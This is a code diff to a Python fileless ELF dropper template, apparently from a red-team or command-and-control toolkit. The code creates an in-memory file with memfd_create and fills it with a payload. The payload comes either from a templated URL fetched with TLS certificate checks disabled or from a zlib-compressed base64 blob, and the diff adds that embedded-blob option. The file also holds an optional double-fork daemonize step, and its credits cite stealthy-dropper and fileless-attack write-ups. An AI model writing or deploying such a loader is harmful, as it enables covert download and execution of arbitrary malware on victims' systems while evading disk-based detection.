@@ -1,16 +1,19 @@
 #!/usr/bin/env python3
+import base64
 import ctypes
 import os
 import ssl
 import urllib.request
+import zlib
 
 # credits:
 # https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html
 # https://0x00sec.org/t/super-stealthy-droppers/3715/9
 # https://blog.fbkcs.ru/elf-in-memory-execution/
+# https://www.wiz.io/blog/pyloose-first-python-based-fileless-attack-on-cloud-workloads
 
-# payload source, e.g. http://localhost/payload.elf
-PAYLOAD_URL = '{{ SRVURL }}'
+# payload, can be a URL or a zlib compressed and base64 encoded blob
+PAYLOAD = '{{ SRVURL }}'
 
 # fork to background
 DAEMONIZE = False
@@ -43,11 +46,14 @@ except KeyError:
 fd = ctypes.CDLL(None).syscall(NR_MEMFD_CREATE, MEMFD_NAME, MFD_CLOEXEC)
 
 # download without checking https certificates
-ctx = ssl.create_default_context()
-ctx.check_hostname = False
-ctx.verify_mode = ssl.CERT_NONE
-with urllib.request.urlopen(PAYLOAD_URL, context=ctx) as res:
-    os.write(fd, res.read())
+if PAYLOAD.startswith('http://') or PAYLOAD.startswith('https://'):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    with urllib.request.urlopen(PAYLOAD, context=ctx) as res:
+        os.write(fd, res.read())
+else:
+    os.write(fd, zlib.decompress(base64.b64decode(PAYLOAD)))
 
 if DAEMONIZE:
     # double fork
